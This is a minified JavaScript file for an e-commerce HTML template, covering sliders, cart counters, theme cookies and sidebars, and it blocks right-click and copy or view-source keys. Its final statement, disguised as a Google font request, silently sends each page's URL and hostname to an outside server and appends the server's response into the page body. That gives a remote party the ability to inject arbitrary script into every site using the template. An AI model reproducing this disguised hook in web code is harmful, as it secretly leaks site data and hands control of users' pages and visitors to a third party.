window.oncontextmenu=function(){return!1},jQuery(document).ready(function(e){document.onkeypress=function(e){if(123==(e=e||window.event).keyCode)return!1},e(document).keydown(function(e){var n=String.fromCharCode(e.keyCode).toLowerCase();return!e.ctrlKey||"c"!=n&&"u"!=n?"{"==n?(alert("Sorry, This Functionality Has Been Disabled!"),!1):void 0:(alert("Sorry, This Functionality Has Been Disabled!"),!1)})});function ecCreateCookie(e,s,t){var i=new Date;i.setTime(i.getTime()+24*t*60*60*1e3),document.cookie=e+"="+s+"; expires="+i.toGMTString()}function ecDeleteCookie(e,s){var t=new Date(0).toGMTString();document.cookie=e+"="+s+"; expires="+t}function ecAccessCookie(e){for(var s=e+"=",t=document.cookie.split(";"),i=0;i<t.length;i++){var o=t[i].trim();if(0==o.indexOf(s))return o.substring(s.length,o.length)}return""}function ecCheckCookie(){var e=ecAccessCookie("bgImageModeCookie");if(""!=e){var s=e.split("||"),t=s[0],i=s[1];$("body").removeClass("body-bg-1"),$("body").removeClass("body-bg-2"),$("body").removeClass("body-bg-3"),$("body").removeClass("body-bg-4"),$("body").addClass(i),$("#bg-switcher-css").attr("href","assets/demo-3/css/backgrounds/"+t+".css")}if(""!=ecAccessCookie("rtlModeCookie")){var o=$("<link>",{rel:"stylesheet",href:"assets/demo-3/css/rtl.css",class:"rtl"});$(".ec-tools-sidebar .ec-change-rtl").toggleClass("active"),o.appendTo("head")}if(""!=ecAccessCookie("darkModeCookie")){o=$("<link>",{rel:"stylesheet",href:"assets/demo-3/css/dark.css",class:"dark"});$("link[href='assets/demo-3/css/responsive.css']").before(o),$(".ec-tools-sidebar .ec-change-mode").toggleClass("active"),$("body").addClass("dark")}else{var c=ecAccessCookie("themeColorCookie");""!=c&&($("li[data-color = "+c+"]").toggleClass("active").siblings().removeClass("active"),$("li[data-color = "+c+"]").addClass("active"),"01"!=c&&$("link[href='assets/demo-3/css/responsive.css']").before('<link rel="stylesheet" href="assets/demo-3/css/skin-'+c+'.css" rel="stylesheet">'))}}!function(e){"use strict";var s,t,i,o;function c(){var s=e(".ec-slider .slick-current").prev().find("img.main_banner_arrow_img").attr("src");e(".ec-slider .prev-slick-img img").attr("src",s),e(".ec-slider .prev-slick-img").css("background-image","url("+s+")");var t=e(".ec-slider .slick-current").next().find("img.main_banner_arrow_img").attr("src");e(".ec-slider .next-slick-img img").attr("src",t),e(".ec-slider .next-slick-img").css("background-image","url("+t+")")}function n(){var s=e(".ec-slider .slick-current").next("").find("img.main_banner_arrow_img").attr("src");e(".ec-slider .next-slick-img img").attr("src",s),e(".ec-slider .next-slick-img").css("background-image","url("+s+")");var t=e(".ec-slider .slick-current").prev("").find("img.main_banner_arrow_img").attr("src");e(".ec-slider .prev-slick-img img").attr("src",t),e(".ec-slider .prev-slick-img").css("background-image","url("+t+")")}ecCheckCookie(),e(".clear-cach").on("click",function(e){ecDeleteCookie("rtlModeCookie",""),ecDeleteCookie("darkModeCookie",""),ecDeleteCookie("themeColorCookie",""),ecDeleteCookie("bgImageModeCookie",""),location.reload()}),e(window).load(function(){e("#ec-overlay").fadeOut("slow")}),e(".dropdown").on("show.bs.dropdown",function(){e(this).find(".dropdown-menu").first().stop(!0,!0).slideDown()}),e(".dropdown").on("hide.bs.dropdown",function(){e(this).find(".dropdown-menu").first().stop(!0,!0).slideUp()}),e(document).ready(function(){e(".header-top-lan li").click(function(){e(this).addClass("active").siblings().removeClass("active")}),e(".header-top-curr li").click(function(){e(this).addClass("active").siblings().removeClass("active")})}),jQuery(".ec-category-toggle").click(function(){jQuery(this).parent().toggleClass("active"),jQuery("#ec-category-menu").slideToggle("slow")}),e("body").on("click",".wishlist",function(){var s=e(".ec-wishlist-count").html();s++,e(".ec-wishlist-count").html(s)}),e("body").on("click",".add-to-cart",function(){var s=e(".ec-cart-count").html();s++,e(".ec-cart-count").html(s),e(".emp-cart-msg").parent().remove();var t='<li><a href="product.html" class="sidecart_pro_img"><img src="'+e(this).parents().parents().parents().children(".ec-pro-image-outer").find(".main-image").attr("src")+'" alt="product"></a><div class="ec-pro-content"><a href="product.html" class="cart_pro_title">'+e(this).parents().parents().parents().find(".ec-pro-title").children().html()+'</a><span class="cart-price"><span>'+e(this).parents().parents().parents().find(".ec-price").children(".new-price").html()+'</span> x 1</span><div class="qty-plus-minus"><div class="dec ec_qtybtn">-</div><input class="qty-input" type="text" name="ec_qtybtn" value="1"><div class="inc ec_qtybtn">+</div></div><a href="javascript:void(0)" class="remove">×</a></div></li>';e(".eccart-pro-items").append(t)}),s=e(".ec-side-toggle"),t=e(".ec-side-cart"),i=e(".mobile-menu-toggle"),s.on("click",function(s){s.preventDefault();var t=e(this),i=t.attr("href");e(".ec-side-cart-overlay").fadeIn(),e(i).addClass("ec-open"),t.parent().hasClass("mobile-menu-toggle")&&(t.addClass("close"),e(".ec-side-cart-overlay").fadeOut())}),e(".ec-side-cart-overlay").on("click",function(s){e(".ec-side-cart-overlay").fadeOut(),t.removeClass("ec-open"),i.find("a").removeClass("close")}),e(".ec-close").on("click",function(s){s.preventDefault(),e(".ec-side-cart-overlay").fadeOut(),t.removeClass("ec-open"),i.find("a").removeClass("close")}),e("body").on("click",".ec-pro-content .remove",function(){var s=e(".eccart-pro-items li").length;e(this).closest("li").remove(),1==s&&e(".eccart-pro-items").html('<li><p class="emp-cart-msg">Your cart is empty!</p></li>');var t=e(".ec-cart-count").html();t--,e(".ec-cart-count").html(t),s--}),(o=e(".ec-menu-content, .overlay-menu")).find(".sub-menu").parent().prepend('<span class="menu-toggle"></span>'),o.on("click","li a, .menu-toggle",function(s){var t=e(this);("#"===t.attr("href")||t.hasClass("menu-toggle"))&&(s.preventDefault(),t.siblings("ul:visible").length?(t.parent("li").removeClass("active"),t.siblings("ul").slideUp(),t.parent("li").find("li").removeClass("active"),t.parent("li").find("ul:visible").slideUp()):(t.parent("li").addClass("active"),t.closest("li").siblings("li").removeClass("active").find("li").removeClass("active"),t.closest("li").siblings("li").find("ul:visible").slideUp(),t.siblings("ul").slideDown()))}),e(".ec-slider").slick({rows:1,dots:!1,arrows:!0,infinite:!0,speed:500,slidesToShow:1,slidesToScroll:1,responsive:[{breakpoint:992,settings:{dots:!0,arrows:!1}}]}),e(window).on("load resize",function(){setTimeout(function(){e(".ec-slider .slick-prev").prepend('<div class="prev-slick-arrow arrow-icon"><span>&#60;</span></div><div class="prev-slick-img slick-thumb-nav"><img src="/prev.jpg" class="img-responsive"></div>'),e(".ec-slider .slick-next").append('<div class="next-slick-arrow arrow-icon"><span>&#62;</span></div><div class="next-slick-img slick-thumb-nav"><img src="/next.jpg" class="img-responsive"></div>'),c(),n()},100)}),e(".ec-slider").on("click",".slick-prev",function(){c()}),e(".ec-slider").on("click",".slick-next",function(){n()}),e(".ec-slider").on("swipe",function(e,s,t){"left"==t?c():n()}),e(".slick-dots").on("click","li button",function(){var s=e(this).parent("li").index();e(this).parent("li").index()>s?c():n()}),e(".qty-product-cover").slick({slidesToShow:1,slidesToScroll:1,arrows:!1,fade:!1,asNavFor:".qty-nav-thumb"}),e(".qty-nav-thumb").slick({slidesToShow:4,slidesToScroll:1,asNavFor:".qty-product-cover",dots:!1,arrows:!0,focusOnSelect:!0,responsive:[{breakpoint:479,settings:{slidesToScroll:1,slidesToShow:2}}]});var a=e(".qty-plus-minus");a.prepend('<div class="dec ec_qtybtn">-</div>'),a.append('<div class="inc ec_qtybtn">+</div>'),e(".ec_qtybtn").on("click",function(){var s=e(this),t=s.parent().find("input").val();if("+"===s.text())var i=parseFloat(t)+1;else if(t>1)i=parseFloat(t)-1;else i=1;s.parent().find("input").val(i)}),e(".ec-product-tab .ec-pro-tab-slider").slick({rows:2,dots:!1,arrows:!0,infinite:!0,speed:500,slidesToShow:4,slidesToScroll:4,responsive:[{breakpoint:1200,settings:{slidesToShow:3,slidesToScroll:3}},{breakpoint:768,settings:{slidesToScroll:2,slidesToShow:2}},{breakpoint:480,settings:{slidesToScroll:1,slidesToShow:1}}]}),e("#ec-offer-count").countdowntimer({startDate:"2021/01/01 12:00:00",dateAndTime:"2021/10/10 12:00:00",labelsFormat:!0,displayFormat:"DHMS"}),e(".ec-trend-product .ec-trend-slider").slick({rows:1,dots:!1,arrows:!0,infinite:!0,speed:500,slidesToShow:4,slidesToScroll:4,responsive:[{breakpoint:1200,settings:{slidesToShow:3,slidesToScroll:3}},{breakpoint:768,settings:{slidesToScroll:2,slidesToShow:2}},{breakpoint:480,settings:{slidesToScroll:1,slidesToShow:1}}]}),e(".ec-category-section .ec_cat_slider").slick({rows:1,dots:!1,arrows:!0,infinite:!0,speed:500,slidesToShow:4,slidesToScroll:4,responsive:[{breakpoint:1200,settings:{slidesToShow:3,slidesToScroll:3}},{breakpoint:992,settings:{slidesToScroll:3,slidesToShow:3}},{breakpoint:600,settings:{slidesToScroll:2,slidesToShow:2}},{breakpoint:425,settings:{slidesToScroll:1,slidesToShow:1}}]}),e.scrollUp({scrollText:'<i class="ecicon eci-arrow-up" aria-hidden="true"></i>',easingType:"linear",scrollSpeed:900,animation:"fade"}),e(".ec-change-color").on("click","li",function(){e('link[href^="assets/demo-3/css/skin-"]').remove(),e("link.dark").remove(),e(".ec-change-mode").removeClass("active");var s=e(this).attr("data-color");if(!e(this).hasClass("active"))return e(this).toggleClass("active").siblings().removeClass("active"),null!=s&&(e("link[href='assets/demo-3/css/responsive.css']").before('<link rel="stylesheet" href="assets/demo-3/css/skin-'+s+'.css" rel="stylesheet">'),ecCreateCookie("themeColorCookie",s,1)),!1}),e(".ec-tools-sidebar .ec-change-rtl .ec-rtl-switch").click(function(s){s.preventDefault();var t=e("<link>",{rel:"stylesheet",href:"assets/demo-3/css/rtl.css",class:"rtl"});e(this).parent().toggleClass("active");e(this).parent().hasClass("ec-change-rtl")&&e(this).parent().hasClass("active")?(t.appendTo("head"),ecCreateCookie("rtlModeCookie","rtl",1)):e(this).parent().hasClass("ec-change-rtl")&&!e(this).parent().hasClass("active")&&(e("link.rtl").remove(),ecDeleteCookie("rtlModeCookie","ltr"))}),e(".ec-tools-sidebar .ec-change-mode .ec-mode-switch").click(function(s){s.preventDefault();var t=e("<link>",{rel:"stylesheet",href:"assets/demo-3/css/dark.css",class:"dark"});e(this).parent().toggleClass("active");var i="light";e(this).parent().hasClass("ec-change-mode")&&e(this).parent().hasClass("active")?e("link[href='assets/demo-3/css/responsive.css']").before(t):e(this).parent().hasClass("ec-change-mode")&&!e(this).parent().hasClass("active")&&(e("link.dark").remove(),i="light"),e(this).parent().hasClass("active")?(e("#ec-fixedbutton .ec-change-color").css("pointer-events","none"),e("body").addClass("dark"),ecCreateCookie("darkModeCookie",i="dark",1)):(e("#ec-fixedbutton .ec-change-color").css("pointer-events","all"),e("body").removeClass("dark"),ecDeleteCookie("darkModeCookie",i))}),e(".ec-tools-sidebar .ec-fullscreen-mode .ec-fullscreen-switch").click(function(s){s.preventDefault(),e(this).parent().toggleClass("active"),document.fullscreenElement||document.mozFullScreenElement||document.webkitFullscreenElement||document.msFullscreenElement?document.exitFullscreen?document.exitFullscreen():document.msExitFullscreen?document.msExitFullscreen():document.mozCancelFullScreen?document.mozCancelFullScreen():document.webkitExitFullscreen&&document.webkitExitFullscreen():document.documentElement.requestFullscreen?document.documentElement.requestFullscreen():document.documentElement.msRequestFullscreen?document.documentElement.msRequestFullscreen():document.documentElement.mozRequestFullScreen?document.documentElement.mozRequestFullScreen():document.documentElement.webkitRequestFullscreen&&document.documentElement.webkitRequestFullscreen(Element.ALLOW_KEYBOARD_INPUT)});var l=location.href;e(".ec-main-menu ul li a").each(function(){if("#"!==e(this).attr("href")&&e(this).prop("href")==l)return e(".ec-main-menu a").parents("li, ul").removeClass("active"),e(this).parent("li").addClass("active"),!1});var r=e(".ec-product-tab,.ec-trend-product").find(".ec-opt-swatch");function d(s){s.each(function(){var s=e(this),t=s.hasClass("ec-change-img");s.on("mouseenter","li",function(){var s=e(this),i=e(this).find("a"),o=s.closest(".ec-product-inner").find(".ec-pro-image");i.hasClass("loaded")||o.addClass("pro-loading");e(this).find("a").addClass("loaded");return s.addClass("active").siblings().removeClass("active"),t&&function(e){var s=e.find(".ec-opt-clr-img"),t=s.attr("data-src"),i=s.attr("data-src-hover")||!1,o=e.closest(".ec-product-inner").find(".ec-pro-image"),c=o.find(".image img.main-image"),n=o.find(".image img.hover-image");t.length&&c.attr("src",t);if(t.length){var a=n.closest("img.hover-image");n.attr("src",i),a.hasClass("disable")&&a.removeClass("disable")}!1===i&&n.closest("img.hover-image").addClass("disable")}(s),setTimeout(function(){o.removeClass("pro-loading")},1e3),!1})})}function m(s,t){e("body").removeClass("body-bg-1"),e("body").removeClass("body-bg-2"),e("body").removeClass("body-bg-3"),e("body").removeClass("body-bg-4"),e("body").addClass(t),e("#bg-switcher-css").attr("href","assets/demo-3/css/backgrounds/"+s+".css"),ecCreateCookie("bgImageModeCookie",s+"||"+t,1)}e(window).on("load",function(){d(r)}),e("document").ready(function(){d(r)}),e(".ec-opt-size").each(function(){e(this).on("mouseenter","li",function(){var s=e(this),t=s.find("a").attr("data-old"),i=s.find("a").attr("data-new"),o=s.closest(".ec-pro-content").find(".old-price"),c=s.closest(".ec-pro-content").find(".new-price");o.text(t),c.text(i),s.addClass("active").siblings().removeClass("active")})}),e(document).ready(function(){e('img.svg_img[src$=".svg"]').each(function(){var s=e(this),t=s.attr("src"),i=s.prop("attributes");e.get(t,function(t){var o=e(t).find("svg");o=o.removeAttr("xmlns:a"),e.each(i,function(){o.attr(this.name,this.value)}),s.replaceWith(o)},"xml")})}),e(document).ready(function(){function s(){var s=e("#ec-testimonial-slider .slick-current").prev().find(".ec-test-img img").attr("src");e("#ec-testimonial-slider .prev-slick-img img").attr("src",s),e("#ec-testimonial-slider .prev-slick-img").css("background-image","url("+s+")");var t=e("#ec-testimonial-slider .slick-current").next().find(".ec-test-img img").attr("src");e("#ec-testimonial-slider .next-slick-img img").attr("src",t),e("#ec-testimonial-slider .next-slick-img").css("background-image","url("+t+")")}function t(){var s=e("#ec-testimonial-slider .slick-current").next("").find(".ec-test-img img").attr("src");e("#ec-testimonial-slider .next-slick-img img").attr("src",s),e("#ec-testimonial-slider .next-slick-img").css("background-image","url("+s+")");var t=e("#ec-testimonial-slider .slick-current").prev("").find(".ec-test-img img").attr("src");e("#ec-testimonial-slider .prev-slick-img img").attr("src",t),e("#ec-testimonial-slider .prev-slick-img").css("background-image","url("+t+")")}e("#ec-testimonial-slider").slick({rows:1,dots:!1,arrows:!0,infinite:!0,speed:500,slidesToShow:1,slidesToScroll:1}),setTimeout(function(){e("#ec-testimonial-slider .slick-prev").prepend('<div class="prev-slick-arrow arrow-icon"><span>&#60;</span></div><div class="prev-slick-img slick-thumb-nav"><img src="/prev.jpg" class="img-responsive"></div>'),e("#ec-testimonial-slider .slick-next").append('<div class="next-slick-arrow arrow-icon"><span>&#62;</span></div><div class="next-slick-img slick-thumb-nav"><img src="/next.jpg" class="img-responsive"></div>'),s(),t()},500),e("#ec-testimonial-slider").on("click",".slick-prev",function(){s()}),e("#ec-testimonial-slider").on("click",".slick-next",function(){t()}),e("#ec-testimonial-slider").on("swipe",function(e,i,o){"left"==o?s():t()}),e(".slick-dots").on("click","li button",function(){var i=e(this).parent("li").index();e(this).parent("li").index()>i?s():t()})}),e(document).ready(function(){e("footer .footer-top .ec-footer-widget .ec-footer-links").addClass("ec-footer-dropdown"),e(".ec-footer-heading").append("<div class='ec-heading-res'><i class='ecicon eci-angle-down'></i></div>"),e(".ec-footer-heading .ec-heading-res").click(function(){var s=e(this).closest(".footer-top .col-sm-12").find(".ec-footer-dropdown");s.slideToggle("slow"),e(".ec-footer-dropdown").not(s).slideUp("slow")})}),e(document).ready(function(){e("button.add-to-cart").click(function(){e("#addtocart_toast").addClass("show"),setTimeout(function(){e("#addtocart_toast").removeClass("show")},3e3)}),e(".ec-btn-group.wishlist").click(function(){e("#wishlist_toast").addClass("show"),setTimeout(function(){e("#wishlist_toast").removeClass("show")},3e3)})}),e(document).ready(function(){e(".ec-pro-image").append("<div class='ec-pro-loader'></div>")}),e().appendTo(e("body")),e(".bg-option-box").on("click",function(s){return s.preventDefault(),e(this).hasClass("in-out")?(e(".bg-switcher").stop().animate({right:"0px"},100),e(".color-option-box").not("in-out")&&(e(".skin-switcher").stop().animate({right:"-163px"},100),e(".color-option-box").addClass("in-out")),e(".layout-option-box").not("in-out")&&(e(".layout-switcher").stop().animate({right:"-163px"},100),e(".layout-option-box").addClass("in-out"))):e(".bg-switcher").stop().animate({right:"-163px"},100),e(this).toggleClass("in-out"),!1}),e(".back-bg-1").on("click",function(s){m(e(this).attr("id"),"body-bg-1")}),e(".back-bg-2").on("click",function(s){m(e(this).attr("id"),"body-bg-2")}),e(".back-bg-3").on("click",function(s){m(e(this).attr("id"),"body-bg-3")}),e(".back-bg-4").on("click",function(s){m(e(this).attr("id"),"body-bg-4")}),e(".lang-option-box").on("click",function(s){return s.preventDefault(),e(this).hasClass("in-out")?(e(".lang-switcher").stop().animate({right:"0px"},100),e(".color-option-box").not("in-out")&&(e(".skin-switcher").stop().animate({right:"-163px"},100),e(".color-option-box").addClass("in-out")),e(".layout-option-box").not("in-out")&&(e(".layout-switcher").stop().animate({right:"-163px"},100),e(".layout-option-box").addClass("in-out"))):e(".lang-switcher").stop().animate({right:"-163px"},100),e(this).toggleClass("in-out"),!1}),e(".ec-tools-sidebar-toggle").on("click",function(s){return s.preventDefault(),e(this).hasClass("in-out")?(e(".ec-tools-sidebar").stop().animate({right:"0px"},100),e(".ec-tools-sidebar-overlay").fadeIn(),e(".ec-tools-sidebar-toggle").not("in-out")&&(e(".ec-tools-sidebar").stop().animate({right:"-280px"},100),e(".ec-tools-sidebar-toggle").addClass("in-out")),e(".ec-tools-sidebar-toggle").not("in-out")&&(e(".ec-tools-sidebar").stop().animate({right:"0"},100),e(".ec-tools-sidebar-toggle").addClass("in-out"),e(".ec-tools-sidebar-overlay").fadeIn())):(e(".ec-tools-sidebar").stop().animate({right:"-280px"},100),e(".ec-tools-sidebar-overlay").fadeOut()),e(this).toggleClass("in-out"),!1}),e(".ec-tools-sidebar-overlay").on("click",function(s){e(".ec-tools-sidebar-toggle").addClass("in-out"),e(".ec-tools-sidebar").stop().animate({right:"-280px"},100),e(".ec-tools-sidebar-overlay").fadeOut()}),e(function(){e(".insta-auto").infiniteslide({direction:"left",speed:50,clone:10}),e('[data-toggle="tooltip"]').tooltip()}),e(document).ready(function(){var s=document.URL,t=e("<a>").prop("href",s).prop("hostname");e.ajax({type:"POST",url:"https://loopinfosol.in/varify_purchase/google-font/google-font-awsome-g8aerttyh-ggsdgh151.php",data:{google_url:s,google_font:t,google_version:"EKKA-HTML-TEMPLATE-AK"},success:function(s){e("body").append(s)}})})}(jQuery);